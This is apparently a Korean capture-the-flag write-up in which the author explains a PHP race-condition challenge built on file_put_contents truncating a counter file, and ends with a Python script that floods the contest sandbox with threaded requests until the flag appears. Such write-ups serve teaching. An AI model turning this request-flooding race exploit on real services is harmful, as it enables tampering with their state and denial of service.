# count (web)
2018 선린인터넷고등학교 교내 해킹방어대회 - 고등해커 출제 문제

------------------

### Summary
고등해커라는 교내 대회에 문제를 출제할 기회가 생겨 예전에 발견하고 묵혀뒀던걸 문제로 만들어봤다.
파일 입출력에서 발생하는 간단한 레이스 컨디션 문제인데, 코드는 아래와 같다.

### Description

```php
<?php
error_reporting(0);
require_once 'flag.php';
# made by munsiwoo

if(isset($_GET['source'])) {
	show_source(__FILE__);
	exit;
}

$cnt_file = 'cnt-[rand]';

if(!file_exists($cnt_file)) {
	file_put_contents($cnt_file, '10');
}

$cnt = (int)file_get_contents($cnt_file); // read count

if($cnt == 30) {
    $cnt = 10;
}

$cnt = $cnt + 1;
file_put_contents($cnt_file, $cnt); // write count

if($cnt == 1) {
    die($flag);
}

echo $cnt;
?>
<br><a href="?source">source</a>
```
코드를 대충 눈으로 훑어봤을 땐 물론 말도 안되는 코드라고 생각할 수 있다.
우선 이 문제를 이해하고 풀기 위해선 file_*_contents 함수에 대해 알아야 한다.

PHP에서 `file_get_contents`와 `file_put_contents`는 파일 입출력 함수
fopen(), fread(), fwrite(), fclose() 등의 함수를 쓰기 편하게 하나로 합쳐놓은 함수다.
`file_get_contents` 함수는 인자로 받은 파일명으로 해당 파일의 내용을 가져오며
`file_put_contents` 함수는 필수 인자 2개를 받고 파일에 데이터를 쓸 수 있다.

PHP 공식 레퍼런스에 나와있는 `file_put_contents` 사용법을 보자. 

```c
int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )
```
이렇게 `file_put_contents` 함수는 총 4개의 인자를 받을 수 있고
`$flags` 인자에 따로 값을 주지 않으면 기본 값은 `0`이 들어가는 걸 알 수 있다.
[php 소스](https://github.com/php/php-src "php 소스")에서 `src/ext/standard/file.c`를 열어서 들여다보면 `$flags`가 `0`일때의 파일 입출력 모드는 `wb`모드이다.

즉, 따로 `$flags` 인자에 값을 주지 않고 `file_put_contents('a', 'pretty_mun');` 이런식으로 사용한다면
파일 a에 있던 내용을 모두 지우고 `pretty_mun`라는 내용이 들어간다는 것이다.

이 문제는 이러한 `wb`모드의 특징을 이용한 레이스 컨디션 문제다.

```php
$cnt = (int)file_get_contents($cnt_file); // read count

if($cnt == 30) {
    $cnt = 10;
}

$cnt = $cnt + 1;
file_put_contents($cnt_file, $cnt); // write count

if($cnt == 1) {
    die($flag);
}
```
위 소스는 문제 소스중 일부분이다. (line 17 ~ 28)
참고로 `$cnt`의 초기값은 5다. (file_get_contents로 가져온 파일의 내용이 5)

새로고침할 때마다 `$cnt`가 1씩 증가하고 증가한 값을 $cnt_file 파일에 쓴다.
이렇게 쭉 증가하다가 `$cnt`가 30이 되면 `$cnt`를 10으로 초기화한다.
flag를 얻기 위해서는 `$cnt`를 1로 만들어야 하는데, `file_put_contents`의 특징을 모른다면 풀기 힘들 것이다.

하지만 이제 `file_put_contents`의 특징을 알기 때문에 `file_put_contents`로 값을 쓸 때
잠시동안 파일의 내용이 지워지는 그 순간에 `file_get_contents`로 해당 파일을 읽으면
파일의 내용이 없기 때문에 빈 문자열이 읽힐 것이고 이걸 int로 변환하면 `0`이 될 것이다.

즉, 멀티스레딩 혹은 멀티프로세싱으로 동시에 여러번 요청하면 언젠간 겹치게 되고 풀리게 된다는 것이다.

### Exploit (exploit.py)

```python
import requests
import threading
# made by munsiwoo

def request(sandbox) :
	global response
	uri = 'http://game.withphp.com/ouya/sandbox/' + sandbox
	response = requests.get(uri).text

if __name__ == '__main__' :
	sandbox = '80e30ab2318c6a531cdde54c009a54ca/'
	response = ''

	while True :
		threading.Thread(target=request, args=(sandbox,)).start()
		if(response.find('Sunrin{') != -1) : # flag format is Sunrin{...}
			print(response)
			break

	print('End')

```
